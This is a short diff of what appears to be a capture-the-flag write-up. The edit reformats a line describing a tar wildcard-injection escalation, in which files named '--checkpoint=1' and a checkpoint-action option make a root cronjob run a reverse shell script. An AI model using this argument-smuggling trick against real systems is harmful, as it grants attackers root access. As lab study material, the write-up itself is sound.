@@ -330,7 +330,7 @@ Put reverse shell script in the `restapi` directory
 [alfredo@fedora restapi]$ echo "" > "--checkpoint=1"
 ```
 
-And run the commands above. These commands are registered as “tar czf /tmp/flask.tar.gz --checkpoint-action=exec=sh [rev.sh](http://rev.sh) --checkpoint=1” when cronjob is executed.
+And run the commands above. These commands are registered as `tar czf /tmp/flask.tar.gz --checkpoint-action=exec=sh rev.sh --checkpoint=1` when cronjob is executed.
 
 # Root shell
 
